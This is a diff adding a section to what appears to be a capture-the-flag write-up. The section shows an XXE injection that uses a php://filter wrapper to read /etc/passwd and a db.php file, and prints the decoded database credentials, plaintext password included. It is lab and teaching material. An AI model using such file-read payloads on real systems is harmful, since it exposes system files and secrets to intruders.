@@ -85,3 +85,35 @@ After encoding and resubmitting, I was able to view the /etc/passwd file, see sc
 ![image](https://github.com/user-attachments/assets/032c3181-48ad-4604-9452-8de41cb168c5)
 
 I could now start looking for more interesting data on the system. 
+
+One file we target as this is php is the db.php file, we will need to base64 encode this in a PHP wrapper to avoid bad characters, see on Payload all the Things [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe).
+
+The payload to get this ends up as:
+
+```bash
+# Payload to retrieve PHP file
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
+<bugreport>
+<title>test</title>
+  <cwe>test</cwe>
+  <cvss>test</cvss>
+  <reward>&file;</reward>
+</bugreport>
+```
+
+Decoding the response we can see the dbpassword:
+
+```bash
+# dbpassword
+<?php
+// TODO -> Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+?>
+```
+
